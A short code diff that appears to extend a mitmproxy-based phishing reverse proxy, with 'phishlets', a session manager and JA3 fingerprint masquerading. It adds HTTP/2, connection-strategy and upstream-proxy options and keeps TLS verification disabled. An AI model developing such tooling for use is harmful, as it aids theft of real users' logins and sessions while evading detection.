@@ -26,6 +26,7 @@ except Exception:
 from core.edge.interceptor import VantaInterceptor
 from core.edge.phishlets import PhishletLoader
 from core.edge.session import SessionManager
+from core.common import config
 
 class ProxyMode(str, Enum):
     TRANSPARENT = "transparent"
@@ -40,6 +41,9 @@ class EdgeConfig:
     target_host: str = ""
     tls_profile: str = "modern"
     ja3_masquerade: Optional[str] = None
+    http2: bool = True
+    connection_strategy: str = "lazy"  # eager|lazy
+    upstream_http: Optional[str] = None
     
 class EdgeProxy:
     """
@@ -66,12 +70,19 @@ class EdgeProxy:
         phishlet = self.phishlet_loader.load_from_yaml(phishlet_yaml)
         
         # Configure mitmproxy options
+        upstream_http = self.config.upstream_http or config.get("UPSTREAM_HTTP") or None
+        mode_val = None
+        if upstream_http:
+            mode_val = f"upstream:{upstream_http}"
         opts = options.Options(
             listen_host=self.config.listen_host,
             listen_port=self.config.listen_port,
-            # mode=f"reverse:{self.config.target_host}", # In V5, mode is handled by interceptor mapping
-            ssl_insecure=True
+            ssl_insecure=True,
+            http2=self.config.http2,
+            connection_strategy=self.config.connection_strategy,
         )
+        if mode_val:
+            opts.update(mode=mode_val)
         
         self._master = DumpMaster(opts)
         
